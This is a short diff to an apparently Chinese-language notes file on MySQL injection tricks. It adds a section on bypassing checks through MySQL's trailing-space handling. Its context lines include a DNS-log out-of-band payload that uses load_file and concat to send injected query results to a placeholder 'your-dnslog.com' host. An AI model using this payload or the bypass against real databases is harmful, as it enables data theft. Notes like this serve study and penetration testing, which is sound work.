@@ -302,10 +302,12 @@ thr7.start()
     ```
     select load_file(concat('\\\\', (<sqli>), '.your-dnslog.com'));
     ```
+## 空格绕过
+
+mysql查询的时候将会忽略字符串尾部的空格
 
 ## 参考资料
 
 对MYSQL注入相关内容及部分Trick的归类小结
 
 [https://xz.aliyun.com/t/7169](https://xz.aliyun.com/t/7169)
-
